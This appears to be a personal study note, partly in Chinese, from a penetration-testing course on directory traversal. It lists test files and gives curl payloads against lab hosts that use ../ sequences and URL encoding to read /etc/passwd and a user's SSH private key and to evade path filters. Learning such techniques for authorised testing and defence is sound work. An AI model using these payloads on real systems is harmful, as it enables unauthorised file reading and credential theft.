>[!info]
>-  Understand absolute and relative paths
>- Learn how to exploit directory traversal vulnerabilities
>- Use encoding for special characters

>[!warning] Absolute vs Relative Paths
>- 絕對路徑 : we specify the full file system path including all subdirectories. We can refer to an absolute path from any location in the filesystem. Absolute paths start with a forward slash (/), specifying the root file system1 on Linux. From there, we can navigate through the file system.
>- 相對路徑 : 從某個目錄為出發點，用../向後的那種

* 判斷點
    * Windows測試路徑:`\Windows\System32\drivers\etc\host`
    * Linux路徑測試: `/etc/passwd`
* 有可能有path traversal的範例
``` 
https://example.com/cms/login.php?language=en.html
```
``` 
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
```
``` title:pg_Bottleup
curl http://192.168.154.246:8080/view?page=/..%%32%66..%%32%66/etc/passwd
```
## 搭配curl使用
* 用crul抓取id_rsa
```
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
```
* 用crul抓取設定絕對路徑
```
curl --path-as-is http://192.168.209.193:3000/public/plugins/alertlist/../../../../../../../../Users/install.txt
```
![[Pasted image 20250504084135.png]]
## Encoding Special Characters
>[!info]
>可以利用Encoding來規避過濾../的防禦機制
- 未使用Encoding
``` =
curl http://192.168.50.16/cgi-bin/../../../../etc/passwd
```
- 使用Encoding
```
curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```
![[Pasted image 20250504085521.png]]





























































































